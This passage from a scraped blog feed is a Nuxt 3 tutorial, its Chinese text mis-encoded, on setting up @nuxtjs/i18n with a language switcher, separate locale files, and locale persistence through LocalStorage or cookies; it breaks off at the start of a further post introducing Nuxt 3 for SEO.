å®‰è£çš„æ™‚å€™éœ€è¦ç¨å¾®æ³¨æ„ä¸€ä¸‹ã€‚\nä¸‹åœ–æ–¼ 2020/10/10 æ“·å–è‡ª NPM - @nuxyjs/i18n\nStep 1. å®‰è£ @nuxtjs/i18n ç›®å‰æœ‰ A æˆ– B å…©ç¨®æ–¹å¼å¯ä»¥å®‰è£ @nuxtjs/i18n v8 åˆ†åˆ¥å¦‚ä¸‹ï¼Œå¯ä»¥é¸æ“‡å…¶ä¸­ä¸€ç¨®å³å¯ï¼š\nA. ä½¿ç”¨ next æ¨™ç±¤ä¾†å®‰è£ v8 ç‰ˆæœ¬\n1 2 3 npm install -D @nuxtjs/i18n@next # or # yarn add -D @nuxtjs/i18n@next B. å®‰è£ @nuxtjs/i18n-edge (Edge Version)\næ·»åŠ  \u0026quot;@nuxtjs/i18n\u0026quot;: \u0026ldquo;npm:@nuxtjs/i18n-edge\u0026rdquo; è‡³ package.json çš„ dependencies æˆ– devDependencies ä¾è³´ä¸­ï¼Œçœ‹èµ·ä¾†å¯èƒ½åƒé€™æ¨£ï¼š 1 2 3 4 5 6 7 8 { // ... \u0026#34;devDependencies\u0026#34;: { // ... \u0026#34;@nuxtjs/i18n\u0026#34;: \u0026#34;npm:@nuxtjs/i18n-edge\u0026#34;, // ... } } åŸ·è¡Œ npm install é€™é‚Šæˆ‘ä½¿ç”¨çš„æ˜¯ç”¨ next æ¨™ç±¤ä¾†å®‰è£ã€‚\nStep 2. æ·»åŠ æ¨¡çµ„ æ–¼ nuxt.config.ts ä¸­çš„ modules å±¬æ€§æ·»åŠ  '@nuxtjs/i18n'ï¼Œåƒè€ƒå¦‚ä¸‹ï¼š\nnuxt.config.ts 1 2 3 export default defineNuxtConfig({ modules: [\u0026#39;@nuxtjs/i18n\u0026#39;] }) Step 3. è¨­å®š i18n åƒæ•¸ ç•¶æ·»åŠ å®Œæ¨¡çµ„å¾Œï¼Œæˆ‘å€‘å¯ä»¥å…ˆè¨­ç½® @nuxhjs/i18n æ¨¡çµ„çš„é¸é …ï¼Œä¾†æ¸¬è©¦æ˜¯å¦èƒ½æ­£å¸¸é‹ä½œï¼Œæ–¼ nuxt.config.ts ä¸­ï¼Œæ·»åŠ  i18n å±¬æ€§ï¼Œç”¨ä»¥è¨­ç½®**@nuxhjs/i18n** æ¨¡çµ„ï¼›i18n.vueI18n è¨­ç½®çš„é¸é …ä¹Ÿå¯ä»¥åƒè€ƒ Vue I18n v9 å®˜æ–¹æ–‡ä»¶ã€‚\nnuxt.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 export default defineNuxtConfig({ modules: [\u0026#39;@nuxtjs/i18n\u0026#39;], i18n: { vueI18n: { legacy: false, locale: \u0026#39;zh\u0026#39;, messages: { en: { hello: \u0026#39;Hello!\u0026#39;, language: \u0026#39;Language\u0026#39; }, zh: { hello: \u0026#39;ä½ å¥½!\u0026#39;, language: \u0026#39;èªè¨€\u0026#39; } } } } }) è¨˜å¾—è¨­ç½® i18n.vueI18n.legacy ç‚º false ä¾†é—œé–‰ä½¿ç”¨è¼ƒèˆŠçš„ API æ¨¡å¼ã€‚\nStep 4. ç¢ºèªå°ˆæ¡ˆä¸‹çš„ pages ç›®éŒ„ ç•¶å®Œæˆ Step 3. çš„æ¨¡çµ„è¨­ç½®å¾Œï¼Œå°±å¯ä»¥å•Ÿå‹•ä¼ºæœå™¨ä¾†çœ‹çœ‹æ•ˆæœï¼›ä¸éè‹¥æ˜¯ Nuxt 3 å°ˆæ¡ˆç›®éŒ„ä¸‹ç¼ºå°‘äº† pages ç›®éŒ„ï¼Œå¯èƒ½æœƒç„¡æ³•å•Ÿç”¨ Vue Router è‡ªå‹•ç”¢ç”Ÿè·¯ç”±ï¼Œè€Œå‡ºç¾ä¸‹åœ–çš„éŒ¯èª¤ã€‚\næˆ‘å€‘åªéœ€è¦æ–°å¢ ./pages/ingex.vue è·¯ç”±é é¢ï¼Œå°±å¯ä»¥è§£æ±ºéŒ¯èª¤å›‰ï¼\nå»ºç«‹è‹±èªå’Œç¹é«”ä¸­æ–‡çš„èªç³»åˆ‡æ› æˆ‘å€‘å®‰è£èˆ‡é…ç½®å¥½ @nuxtjs/i18n å¾Œï¼Œå¯ä»¥å˜—è©¦å»ºç«‹é é¢ä¾†çœ‹çœ‹æ•ˆæœï¼Œä»¥ä¸‹ä»¥ en èˆ‡ zh ä½œç‚ºè‹±èªå’Œç¹é«”ä¸­æ–‡å…©å€‹èªç³»çš„ä½¿ç”¨ç¯„ä¾‹ã€‚\næ–°å¢ ./pages/index.vue å…§å®¹å¦‚ä¸‹ï¼š\npages/index.vue 1 2 3 4 5 6 7 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center bg-white\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;mt-48 text-8xl font-medium text-blue-500\u0026#34;\u0026gt; {{ $t(\u0026#39;hello\u0026#39;) }} \u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; æˆ‘å€‘å°±å¯ä»¥ä½¿ç”¨ $t() ä¾†å‚³å…¥æˆ‘å€‘åœ¨ nuxt.config.ts ä¸­çš„ i18n.vueI18n.messages å®šç¾©èªç³»èˆ‡å°æ‡‰çš„æ–‡å­—ï¼Œè€Œæˆ‘å€‘é è¨­æ˜¯ zh ç¹é«”ä¸­æ–‡èªç³»ï¼Œç•«é¢ä¸Šå°±å‡ºç¾ hello: \u0026lsquo;ä½ å¥½!\u0026rsquo; å°æ‡‰çš„ã€Œä½ å¥½!ã€æ–‡å­—å›‰ï¼\næ–°å¢æŒ‰éˆ•ä¾†å¯¦ç¾åˆ‡æ›ä¸åŒçš„èªç³»ï¼Œå®Œæ•´çš„ç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center bg-white\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;mt-48 text-8xl font-medium text-blue-500\u0026#34;\u0026gt; {{ $t(\u0026#39;hello\u0026#39;) }} \u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;mt-24 space-x-4\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;inline-flex items-center rounded-md border border-transparent bg-blue-100 px-4 py-2 text-sm font-medium text-blue-700 hover:bg-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2\u0026#34; @click=\u0026#34;setLocale(\u0026#39;en\u0026#39;)\u0026#34; \u0026gt; English \u0026lt;/button\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;inline-flex items-center rounded-md border border-transparent bg-blue-100 px-4 py-2 text-sm font-medium text-blue-700 hover:bg-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2\u0026#34; @click=\u0026#34;setLocale(\u0026#39;zh\u0026#39;)\u0026#34; \u0026gt; ç¹é«”ä¸­æ–‡ \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;mt-4 flex flex-row justify-center\u0026#34;\u0026gt; \u0026lt;label class=\u0026#34;text-gray-600\u0026#34;\u0026gt;{{ $t(\u0026#39;language\u0026#39;) }}\u0026lt;/label\u0026gt; \u0026lt;span class=\u0026#34;ml-4 font-bold text-gray-800\u0026#34;\u0026gt;{{ locale }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { useI18n } from \u0026#39;vue-i18n\u0026#39; const { locale } = useI18n() \u0026lt;/script\u0026gt; è‹¥æ²’æœ‰ç‰¹æ®Šéœ€æ±‚ï¼Œåˆ‡æ›èªç³»ä½ å¯ä»¥é¸æ“‡ç›´æ¥è¨­å®š locale ä¾†è‡ªå‹•éŸ¿æ‡‰æˆ–ä½¿ç”¨ setLocale() ä¾†è¨­å®šèªç³»ã€‚\n1 2 3 4 5 6 7 8 \u0026lt;script setup\u0026gt; import { useI18n } from \u0026#39;vue-i18n\u0026#39; const { locale, setLocale } = useI18n() locale.value = \u0026#39;en\u0026#39; // or setLocale(\u0026#39;en\u0026#39;) \u0026lt;/script\u0026gt; å®Œæˆå¾Œæˆ‘å€‘å°±å¯ä»¥åˆ‡æ› en èˆ‡ zh èªç³»ï¼Œç•¶ç„¶ä½ ä¹Ÿå¯ä»¥è£½ä½œæˆé¸å–®ä¾†æ”¾ç½®æ›´å¤šçš„èªç³»ä¾†æ”¯æ´åˆ‡æ›ã€‚\nç¨ç«‹å­˜æ”¾èªç³»æª”æ¡ˆ éš¨è‘—å°ˆæ¡ˆå¢å¤§ï¼Œèªç³»çš„ç¿»è­¯æ•¸é‡ä¹Ÿæœƒå¢å¤šï¼Œè€Œå…¨éƒ¨æ”¾åœ¨ nuxt.config.ts ä¸­ä¹Ÿå¯¦åœ¨å¤ªéå†—é•·ï¼Œæ‰€ä»¥æˆ‘ç¿’æ…£ç¨ç«‹æ”¾ç½®åœ¨ä¸€å€‹è³‡æ–™å¤¾å…§åšè™•ç†ã€‚\nç¨å¾®èª¿æ•´ä¸€ä¸‹ nuxt.config.ts å¦‚ä¸‹ï¼š\nnuxt.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 export default defineNuxtConfig({ modules: [\u0026#39;@nuxtjs/i18n\u0026#39;], i18n: { defaultLocale: \u0026#39;zh\u0026#39;, langDir: \u0026#39;locales\u0026#39;, locales: [ { code: \u0026#39;en\u0026#39;, file: \u0026#39;en.json\u0026#39;, iso: \u0026#39;en-US\u0026#39;, name: \u0026#39;English\u0026#39; }, { code: \u0026#39;zh\u0026#39;, file: \u0026#39;zh.json\u0026#39;, iso: \u0026#39;zh-TW\u0026#39;, name: \u0026#39;ç¹é«”ä¸­æ–‡\u0026#39; } ], strategy: \u0026#39;no_prefix\u0026#39;, vueI18n: { legacy: false } } }) æ¥è‘—æˆ‘å€‘å°±å¯ä»¥å»ºç«‹å„å€‹èªç³»æ”¾ç½®çš„è³‡æ–™å¤¾å°æ‡‰è‘— i18n.langDir å±¬æ€§ï¼Œç›®éŒ„åç¨±ç‚º localesï¼Œå†ä¾åºå»ºç«‹ en.json èˆ‡ zh.json æª”æ¡ˆï¼Œæœ€çµ‚ç›®éŒ„çš„çµæ§‹å¤§æ¦‚æœƒé•·é€™æ¨£ï¼š\n1 2 3 4 5 6 7 nuxt-app/ â”œâ”€â”€ ... â”œâ”€â”€ locales/ â”‚ â”œâ”€â”€ en.json â”‚ â””â”€â”€ zh.json â”œâ”€â”€ ... â””â”€â”€ nuxt.config.ts ./locales/en.json å…§å®¹å¦‚ä¸‹ï¼š\nlocales/en.json 1 2 3 4 { \u0026#34;hello\u0026#34;: \u0026#34;Hello!\u0026#34;, \u0026#34;language\u0026#34;: \u0026#34;Language\u0026#34; } ./locales/zh.json å…§å®¹å¦‚ä¸‹ï¼š\nlocales/zh.json 1 2 3 4 { \u0026#34;hello\u0026#34;: \u0026#34;ä½ å¥½!\u0026#34;, \u0026#34;language\u0026#34;: \u0026#34;èªè¨€\u0026#34; } ç¿»è­¯çš„èªç³»æª”æ¡ˆï¼Œä¹Ÿå¯ä»¥åœ¨æ ¹æ“šéœ€æ±‚ä½¿ç”¨ .jsã€yaml æˆ– json æ ¼å¼çš„æª”æ¡ˆï¼Œä¾†æ­é…æ¥å—åƒæ•¸ä¾†ç”¢ç”Ÿç¿»è­¯æ–‡å­—ã€‚\næŒä¹…åŒ–èªç³»è¨­å®š ç•¶ä½¿ç”¨è€…åˆ‡æ›èªç³»ä¹‹å¾Œï¼Œæˆ‘å€‘å¸Œæœ›å„²å­˜é€™å€‹èªç³»è¨­å®šï¼Œè®“ä½¿ç”¨è€…ä¸‹æ¬¡ç€è¦½ç¶²ç«™æ™‚ï¼Œèƒ½å¥—ç”¨å„²å­˜çš„èªç³»ï¼Œè€Œä¸ç”¨å†æ¬¡åˆ‡æ›ï¼Œæˆ‘å€‘å¯ä»¥è—‰ç”±ç€è¦½å™¨çš„ LocalStorage æˆ– Cookie ä¾†æŒä¹…åŒ–ã€‚\nLocalStorage ä¾†å„²å­˜èªç³»è¨­å®š æˆ‘å€‘å¯ä»¥åœ¨è®Šæ›´èªç³»æ™‚ï¼ŒåŒæ™‚å°‡èªç³»å„²å­˜è‡³ LocalStorage ä¹‹ä¸­ï¼Œä¸‹æ¬¡ç€è¦½ç¶²ç«™æ™‚ï¼Œå†å¾ä¸­å–å‡ºå¥—ç”¨èªç³»ã€‚\nä¾‹å¦‚ï¼Œæˆ‘å€‘èª¿æ•´ ./pages/index.vue ç¨‹å¼ç¢¼å¦‚ä¸‹ï¼Œåœ¨æˆ‘å€‘è‡ªè¨‚çš„ changeLanguage() æ–¹æ³•å…§ï¼ŒåŒæ™‚å‘¼å« localStorage.setItem('i18n-lang', localeCode) ä¾†å„²å­˜èªç³»ã€‚\npages/index.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center bg-white\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;mt-48 text-8xl font-medium text-blue-500\u0026#34;\u0026gt; {{ $t(\u0026#39;hello\u0026#39;) }} \u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;mt-24 space-x-4\u0026#34;\u0026gt; \u0026lt;button v-for=\u0026#34;localeItem in locales\u0026#34; :key=\u0026#34;localeItem.code\u0026#34; type=\u0026#34;button\u0026#34; class=\u0026#34;inline-flex items-center rounded-md border border-transparent bg-blue-100 px-4 py-2 text-sm font-medium text-blue-700 hover:bg-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2\u0026#34; @click=\u0026#34;changeLanguage(localeItem.code)\u0026#34; \u0026gt; {{ localeItem.name }} \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;mt-4 flex flex-row justify-center\u0026#34;\u0026gt; \u0026lt;label class=\u0026#34;text-gray-600\u0026#34;\u0026gt;{{ $t(\u0026#39;language\u0026#39;) }}\u0026lt;/label\u0026gt; \u0026lt;span class=\u0026#34;ml-4 font-bold text-gray-800\u0026#34;\u0026gt;{{ locale }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { useI18n } from \u0026#39;vue-i18n\u0026#39; const { locale, locales } = useI18n() const changeLanguage = (localeCode) =\u0026gt; { locale.value = localeCode localStorage.setItem(\u0026#39;i18n-lang\u0026#39;, localeCode) } \u0026lt;/script\u0026gt; èª¿æ•´ app.vue å¾ LocalStorage è®€å– i18n-lang çš„è¨­å®šå€¼\napp.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;NuxtPage /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { useI18n } from \u0026#39;vue-i18n\u0026#39; const { locale } = useI18n() const defaultLocaleCode = locale.value if (process.client) { locale.value = localStorage.getItem(\u0026#39;i18n-lang\u0026#39;) ?? defaultLocaleCode } \u0026lt;/script\u0026gt; ç•¶ä¸‹æ¬¡æˆ‘å€‘ç€è¦½ç¶²ç«™æ™‚ï¼Œå°±æœƒæŸ¥çœ‹ LocalStorage ä¸­çš„èªç³»è¨­å®šä¸¦å¥—ç”¨ã€‚\nCookie ä¾†å„²å­˜èªç³»è¨­å®š Nuxt 3 çš„ä¼ºæœå™¨æ¸²æŸ“ï¼Œæœƒå°è‡´ç¬¬ä¸€æ¬¡çš„è«‹æ±‚ç„¡æ³•åœ¨ä¼ºæœå™¨ç«¯å–å¾— LocalStorage çš„è¨­å®šï¼Œæ‰€ä»¥ä¸Šé¢çš„ä¾‹å­ï¼Œä»”ç´°çœ‹æœƒç™¼ç¾ï¼Œé›–ç„¶æ­£ç¢ºçš„å¥—ç”¨å„²å­˜çš„ en è‹±èªèªç³»è¨­å®šï¼Œä½†ç•«é¢æ˜¯å…ˆå¾é è¨­çš„ zh ç¹é«”ä¸­æ–‡å†åˆ‡æ›éå»ï¼Œå°è‡´èªç³»åˆ‡æ›æ™‚é–ƒäº†ä¸€ä¸‹ã€‚\næˆ‘å€‘å¯ä»¥é€éä½¿ç”¨ cookie çš„æ–¹å¼ä¾†å„²å­˜èªç³»ï¼Œé€™æ¨£ä¼ºæœå™¨ç«¯åœ¨æ¥å—ç¬¬ä¸€æ¬¡è«‹æ±‚æ™‚ä¹Ÿèƒ½è§£æå‡ºä½¿ç”¨è€…çš„åå¥½è¨­å®šï¼Œå›å‚³æ­£ç¢ºçš„èªç³»ç¿»è­¯æ–‡å­—ã€‚\nä½ å¯ä»¥è‡ªå·±ä½¿ç”¨ Nuxt 3 æä¾› useCookie ç­‰æ–¹å¼æ“ä½œ cookie ä¾†å¯¦ç¾é€™å¥—æµç¨‹ï¼Œä¸éå‘¢ï¼Œ@nuxtjs/i18n æ¨¡çµ„é è¨­æ˜¯å•Ÿç”¨ cookie ç›¸é—œçš„è¨­å®šï¼Œæä¾›çš„ setLocaleCookie() èˆ‡ getLocaleCookie() å¯ä»¥ä¾†å”åŠ©å„²å­˜èªç³»è¨­å®šè‡³ cookieã€‚\nèª¿æ•´ ./pages/index.vue ç¨‹å¼ç¢¼å¦‚ä¸‹ï¼Œåœ¨æˆ‘å€‘è‡ªè¨‚çš„ changeLanguage() æ–¹æ³•å…§ï¼ŒåŒæ™‚å‘¼å« setLocaleCookie(localeCode) ä¾†å„²å­˜èªç³»ã€‚\npages/index.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center bg-white\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;mt-48 text-8xl font-medium text-blue-500\u0026#34;\u0026gt; {{ $t(\u0026#39;hello\u0026#39;) }} \u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;mt-24 space-x-4\u0026#34;\u0026gt; \u0026lt;button v-for=\u0026#34;localeItem in locales\u0026#34; :key=\u0026#34;localeItem.code\u0026#34; type=\u0026#34;button\u0026#34; class=\u0026#34;inline-flex items-center rounded-md border border-transparent bg-blue-100 px-4 py-2 text-sm font-medium text-blue-700 hover:bg-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2\u0026#34; @click=\u0026#34;changeLanguage(localeItem.code)\u0026#34; \u0026gt; {{ localeItem.name }} \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;mt-4 flex flex-row justify-center\u0026#34;\u0026gt; \u0026lt;label class=\u0026#34;text-gray-600\u0026#34;\u0026gt;{{ $t(\u0026#39;language\u0026#39;) }}\u0026lt;/label\u0026gt; \u0026lt;span class=\u0026#34;ml-4 font-bold text-gray-800\u0026#34;\u0026gt;{{ locale }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { useI18n } from \u0026#39;vue-i18n\u0026#39; const { locale, locales, setLocaleCookie } = useI18n() const changeLanguage = (localeCode) =\u0026gt; { locale.value = localeCode setLocaleCookie(localeCode) } \u0026lt;/script\u0026gt; èª¿æ•´ app.vue å‘¼å« getLocaleCookie() å¾ cookie è§£æçš„è¨­å®šå€¼ï¼Œä¸¦å†é€²è¡Œå¥—ç”¨ã€‚\napp.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;NuxtPage /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { useI18n } from \u0026#39;vue-i18n\u0026#39; const { locale, getLocaleCookie } = useI18n() const defaultLocaleCode = locale.value locale.value = getLocaleCookie() ?? defaultLocaleCode \u0026lt;/script\u0026gt; ç•¶æˆ‘å€‘ä½¿ç”¨ setLocaleCookie() å„²å­˜èªç³»è‡³ cookieï¼Œæœƒå°‡ localeCode å„²å­˜åœ¨ cookie çš„ i18n_redirected å€¼ä¸Šï¼Œç•¶æˆ‘å€‘é‡æ–°é€²å…¥ç¶²é ï¼Œcookie ä¹Ÿå°‡è‡ªå‹•å¤¾å¸¶äº†é€™å€‹ cookie éå»çµ¦ä¼ºæœå™¨ç«¯ï¼Œä¸¦ç”± getLocaleCookie() è§£æå†ç”±æˆ‘å€‘é€²è¡Œèªç³»å¥—ç”¨ã€‚\nå…¶å¯¦ @nuxtjs/i18n å› ç‚ºå·²å°‡ detectBrowserLanguage.useCookie é è¨­ç‚º true ç­‰å•Ÿç”¨äº† cookie å„²å­˜çš„ç›¸é—œè¨­å®šï¼Œç•¶ä½¿ç”¨è€…é€²å…¥ç¶²ç«™æ™‚ï¼Œå°±æœƒå˜—è©¦æª¢æŸ¥ç€è¦½å™¨çš„ cookie ä¾†å°‡ä½¿ç”¨è€…å„²å­˜çš„åå¥½èªè¨€é€²è¡Œå¥—ç”¨æˆ–é‡å®šå‘ã€‚\nå› æ­¤ï¼Œæˆ‘å€‘åœ¨ app.vue ä¹Ÿä¸éœ€è¦ç‰¹åˆ¥å¾ cookie å–å‡ºå†é€²è¡Œå¥—ç”¨ï¼Œ@nuxtjs/i18n æœƒè‡ªå‹•å¹«æˆ‘å€‘å®Œæˆã€‚\napp.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;NuxtPage /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; // é™¤éä½ æœ‰ç‰¹éœ€çš„éœ€æ±‚ï¼Œä¸ç„¶é€™é‚Šéƒ½ä¸éœ€è¦è‡ªå·±ä¾†äº† // import { useI18n } from \u0026#39;vue-i18n\u0026#39; // const { locale, getLocaleCookie } = useI18n() // const defaultLocaleCode = locale.value // locale.value = getLocaleCookie() ?? defaultLocaleCode \u0026lt;/script\u0026gt; è€Œç•¶ä½¿ç”¨è€…èª¿æ•´èªç³»æ™‚ï¼Œåœ¨ç¬¬ä¸€å€‹ç¯„ä¾‹æœ‰æåˆ°ï¼Œå¦‚æœæ²’æœ‰ç‰¹åˆ¥éœ€æ±‚ï¼Œæˆ‘å€‘å¯ä»¥ç›´æ¥ä½¿ç”¨ locale ä¾†è¨­å®šèªç³»ï¼Œä¾†è‡ªå‹•éŸ¿æ‡‰è®Šæ›´èªç³»ï¼Œå†ä½¿ç”¨ setLocaleCookie(localeCode) å°‡èªç³»ä¿å­˜è‡³ cookie ä¹‹å…§ã€‚\n1 2 3 4 5 6 7 8 9 \u0026lt;script setup\u0026gt; import { useI18n } from \u0026#39;vue-i18n\u0026#39; const { locale, locales, setLocaleCookie } = useI18n() const changeLanguage = (localeCode) =\u0026gt; { locale.value = localeCode setLocaleCookie(localeCode) } \u0026lt;/script\u0026gt; ä½†æˆ‘å€‘åªè¦ä½¿ç”¨ setLocal() æ–¹æ³•ä¾†å¥—ç”¨èªç³»ï¼Œå°±æœƒä¸€åŒæ›´æ–°è‡³ cookie ä¸­é€²è¡Œå„²å­˜ï¼Œéå¸¸æ–¹ä¾¿ã€‚æœ€å¾Œæˆ‘å€‘å°‡ ./pages/index.vue ä¸­çš„ èª¿æ•´å¦‚ä¸‹ï¼Œä¸€æ¨£å¯ä»¥é”åˆ°åœ¨ cookie ä¸­å„²å­˜ä½¿ç”¨è€…èªç³»ä¸¦åœ¨ä¸‹æ¬¡ç€è¦½ç¶²é æ™‚è‡ªå‹•å¥—ç”¨ã€‚\npages/index.vue 1 2 3 4 5 6 7 8 \u0026lt;script setup\u0026gt; import { useI18n } from \u0026#39;vue-i18n\u0026#39; const { locale, locales, setLocale } = useI18n() const changeLanguage = (localeCode) =\u0026gt; { setLocale(localeCode) } \u0026lt;/script\u0026gt; ä½¿ç”¨ setLocaleCookie() èˆ‡ getLocaleCookie() æ“ä½œçš„é è¨­è¨­å®šï¼Œæˆ‘å€‘å¯ä»¥é€é nuxt.config.ts ä¸­çš„ i18n.detectBrowserLanguage é€²è¡Œèª¿æ•´ï¼Œä¾‹å¦‚ï¼Œèª¿æ•´ cookieKey ä¾†è®Šæ›´å„²å­˜çš„åç¨± i18n_redirected ç­‰ï¼Œæ›´å¤šé¸é …å¯ä»¥åƒè€ƒé€™è£¡ã€‚\nnuxt.config.ts 1 2 3 4 5 6 7 8 9 10 11 export default defineNuxtConfig({ modules: [\u0026#39;@nuxtjs/i18n\u0026#39;], i18n: { // ... detectBrowserLanguage: { useCookie: true, cookieKey: \u0026#39;i18n_redirected\u0026#39; }, // ... } }) @nuxtjs/i18n æ¨¡çµ„æä¾›çš„ cookie æ“ä½œèªç³»æŒä¹…åŒ–ï¼Œç”šè‡³èƒ½åšåˆ°ä¸€äº›é‡å°å‘ç­‰è¡Œç‚ºï¼Œè¼ƒ Nuxt 3 æä¾› useCookie ç­‰æ–¹å¼è‡ªå·±ä¾†å¯¦ç¾é€™å¥—æµç¨‹èƒ½æ›´æ“æœ‰æ›´å¤šåŠŸèƒ½ã€‚\nç¯„ä¾‹ç¨‹å¼ç¢¼ - Nuxt 3 - æœå°‹å¼•æ“æœ€ä½³åŒ– (SEO) ä¹‹è¨­å®šç¶²é  Meta åŠ OG Tag ç¯„ä¾‹\n","date":"2023-01-16T00:00:00Z","image":"https://live.staticflickr.com/65535/52630283696_c93e29e870_o.png","permalink":"https://wayneblog.ga/2023-01-16/nuxt-nuxt3-practice-project/","title":"ã€Nuxt3ã€‘å¯¦æˆ°ç·´ç¿’ - å¯¦ä½œéƒ¨è½æ ¼"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåœ¨ä½¿ç”¨ Vue 3 é–‹ç™¼ç¶²ç«™å¯èƒ½æœƒé¢è‡¨éœ€è¦åš SEO çš„æƒ…å¢ƒï¼Œç‚ºäº†è§£æ±ºè©²æƒ…å¢ƒå•é¡Œï¼Œä½ å¯èƒ½æœƒæ‰¾åˆ°ä½¿ç”¨ Vite åšé æ¸²æŸ“æˆ–å…¶ä»–æ–¹å¼ï¼ŒNuxt 3 ä¹Ÿæ˜¯å…¶ä¸­ä¸€å€‹è§£æ±ºæ–¹æ¡ˆï¼Œä¸”æœ‰æ›´å¤šå¼·å¤§çš„åŠŸèƒ½ï¼Œç›®å‰ Nuxt 3 å·²ç¶“æ­£å¼ç™¼å¸ƒç©©å®šç‰ˆï¼Œå°±è®“æˆ‘å€‘é–‹å§‹å˜—é®®ä¸Šæ‰‹å§ï¼\næœ¬ç¯‡æœƒè‘—é‡åœ¨ Nuxt 3 çš„ç‰¹è‰²èˆ‡åŠŸèƒ½å­¸ç¿’ï¼Œæ‰€ä»¥ä½ å¯èƒ½éœ€å…·å‚™äº› Vue 3 åŸºç¤ï¼Œæˆ‘å°‡å¾æ­å»º Nuxt 3 é–‹ç™¼ç’°å¢ƒã€é é¢è·¯ç”±èˆ‡ä½ˆå±€ä¸€ç›´åˆ°ä½¿ç”¨ Nuxt 3 å»ºç«‹ SEO æ‰€éœ€çš„è³‡è¨Šåšäº›ç­†è¨˜åŠä»‹ç´¹ï¼Œè®“ä½ æœ‰å€‹æ¦‚å¿µä¸¦å˜—è©¦ç”¨ Nuxt 3 ä¾†åš SSR æˆ– SSGï¼Œé€²è€Œè§£æ±º Vue 3 SPA ä¸å¥½åš SEO çš„å•é¡Œã€‚\nNuxt 3 ä»‹ç´¹ å‰è¨€ æ¡ç”¨ SSR + SPAï¼Œå°‡ç¬¬ä¸€å€‹ç•«é¢é€é SSR ç”¢ç”Ÿï¼Œå…¶ä»–å°±äº¤çµ¦ CSR ä¾†åšè™•ç†ï¼Œæ—¢èƒ½å…¼å…· SEO é‚„èƒ½æ“æœ‰ SPA çš„ä½¿ç”¨è€…é«”é©—ï¼Œä¸æ˜¯å¾ˆå®Œç¾å—ï¼Ÿæ²’æœ‰éŒ¯ï¼Œä½†åœ¨æ²’æœ‰ä»»ä½•æ¡†æ¶è¼”åŠ©ä¹‹ä¸‹ï¼ŒåŒä¸€å€‹é é¢ä½ å¯èƒ½å°±éœ€è¦å¯¦ä½œå…©æ¬¡ç¨‹å¼ç¢¼ï¼Œä¹Ÿå°±æ˜¯å‰å¾Œç«¯å„ä¸€æ¬¡çš„æ¸²æŸ“é‚è¼¯ï¼Œé€™ä¹Ÿå°±æ˜¯ç›¸æ‡‰çš„ä»£åƒ¹ã€‚åœ¨ä»‹ç´¹ Nuxt 3 ä¹‹å‰å°±ç¨å¾®æä¸€ä¸‹ Isomorphic JavaScript èˆ‡ Universal JavaScriptã€‚\nIsomorphic JavaScript èˆ‡ Universal JavaScript Isomorphic JavaScript éš¨è‘— Node.js çš„å‡ºç¾ï¼Œè®“å®¢æˆ¶ç«¯ç€è¦½å™¨ä¹‹å¤–çš„ä¼ºæœå™¨ä¹Ÿèƒ½åŸ·è¡Œ JavaScript ç¨‹å¼ç¢¼ï¼Œä½¿å¾— JavaScript æˆç‚ºä¸€ç¨®åŒæ§‹èªè¨€ (Isomorphic Language)ã€‚Isomorphic JavaScript 